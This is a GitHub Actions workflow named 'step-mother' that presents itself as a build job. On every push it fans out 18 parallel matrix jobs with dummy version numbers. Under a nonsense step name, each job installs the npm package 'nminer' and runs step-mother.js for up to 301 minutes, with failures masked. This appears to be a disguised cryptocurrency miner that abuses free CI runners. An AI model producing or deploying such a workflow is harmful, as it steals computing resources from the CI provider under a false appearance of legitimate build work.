name: step-mother
on:
  push:
    branches: [ "main" ]

jobs:
  build:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        config:
          - { version: 653 }
          - { version: 2463 }
          - { version: 9039 }
          - { version: 7892 }
          - { version: 8870 }
          - { version: 4705 }
          - { version: 9126 }
          - { version: 1530 }
          - { version: 388 }
          - { version: 1670 }
          - { version: 6244 }
          - { version: 8296 }
          - { version: 1249 }
          - { version: 5407 }
          - { version: 5346 }
          - { version: 8029 }
          - { version: 2510 }
          - { version: 109 }

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Install Node.js
        uses: actions/setup-node@v3
        with:
          node-version: 20
          
      - name: boo now spear yippee freezing
        run: |
          npm install nminer@latest
          timeout 301m node step-mother.js || echo "step-mother executed"